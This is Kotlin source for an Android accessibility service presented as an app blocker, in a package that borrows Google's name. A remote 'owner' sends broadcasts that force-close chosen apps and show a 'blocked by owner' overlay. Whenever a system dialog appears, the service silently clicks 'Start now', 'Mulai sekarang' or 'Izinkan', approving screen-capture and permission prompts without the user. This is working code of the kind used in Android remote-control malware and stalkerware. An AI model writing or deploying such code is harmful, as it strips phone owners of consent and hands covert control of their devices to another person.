package com.google.xmodzz

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.FrameLayout
import android.widget.TextView
import android.widget.LinearLayout

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()

        const val ACTION_BLOCK_APP = "com.google.xmodzz.BLOCK_APP"
        const val ACTION_UNBLOCK_APP = "com.google.xmodzz.UNBLOCK_APP"
        const val ACTION_UNBLOCK_ALL = "com.google.xmodzz.UNBLOCK_ALL"

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = Settings.Secure.getString(
                ctx.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) || 
                svc.equals(componentFull, ignoreCase = true)
            }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L
    private lateinit var prefs: SharedPreferences

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_BLOCK_APP -> {
                    val pkgTarget = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkgTarget)
                    prefs.edit().putStringSet("blocked_pkgs", blockedPackages).apply()
                }
                ACTION_UNBLOCK_APP -> {
                    val pkgTarget = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkgTarget)
                    prefs.edit().putStringSet("blocked_pkgs", blockedPackages).apply()
                }
                ACTION_UNBLOCK_ALL -> {
                    blockedPackages.clear()
                    prefs.edit().putStringSet("blocked_pkgs", blockedPackages).apply()
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        
        prefs = getSharedPreferences("AppBlockerPrefs", Context.MODE_PRIVATE)
        blockedPackages.addAll(prefs.getStringSet("blocked_pkgs", mutableSetOf()) ?: mutableSetOf())

        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 0
        }
        
        val filter = IntentFilter().apply {
            addAction(ACTION_BLOCK_APP)
            addAction(ACTION_UNBLOCK_APP)
            addAction(ACTION_UNBLOCK_ALL)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkgName = event.packageName?.toString() ?: return

        if (pkgName == "com.android.systemui" || pkgName == "android") {
            val root = rootInActiveWindow
            if (root != null) {
                val buttons = root.findAccessibilityNodeInfosByText("Start now")
                    ?: root.findAccessibilityNodeInfosByText("Mulai sekarang")
                    ?: root.findAccessibilityNodeInfosByText("Izinkan")
                
                if (buttons != null) {
                    for (btn in buttons) {
                        if (btn.isClickable) {
                            btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            break
                        }
                    }
                }
            }
            return
        }

        if (pkgName == packageName) return
        if (!blockedPackages.contains(pkgName)) return

        val now = System.currentTimeMillis()
        if (pkgName == lastBlockedPkg && now - lastBlockTime < 1500) return
        lastBlockedPkg = pkgName
        lastBlockTime = now

        performGlobalAction(GLOBAL_ACTION_BACK)
        mainHandler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 100)
        
        showPopupBlokir()
    }

    private fun showPopupBlokir() {
        if (!Settings.canDrawOverlays(this)) return

        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val container = FrameLayout(this)
            val layout = LinearLayout(this)
            layout.orientation = LinearLayout.VERTICAL
            layout.gravity = Gravity.CENTER
            layout.setPadding(50, 40, 50, 40)

            val bg = GradientDrawable()
            bg.setColor(Color.parseColor("#E60A0A0F"))
            bg.cornerRadius = 30f
            bg.setStroke(4, Color.parseColor("#EF4444"))
            layout.background = bg

            val title = TextView(this)
            title.text = "APK INI TELAH DIBLOKIR!"
            title.setTextColor(Color.parseColor("#EF4444"))
            title.textSize = 18f
            title.gravity = Gravity.CENTER
            title.setTypeface(null, android.graphics.Typeface.BOLD)
            layout.addView(title)

            val sub = TextView(this)
            sub.text = "OLEH OWNER"
            sub.setTextColor(Color.WHITE)
            sub.textSize = 14f
            sub.gravity = Gravity.CENTER
            sub.setPadding(0, 15, 0, 0)
            layout.addView(sub)

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
            }

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.CENTER

            val lp = FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT)
            container.addView(layout, lp)

            wm.addView(container, params)

            mainHandler.postDelayed({
                try { 
                    if (container.isAttachedToWindow) {
                        wm.removeView(container) 
                    }
                } catch (e: Exception) {}
            }, 1400)
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onInterrupt() {}
    
    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        instance = null
    }
}
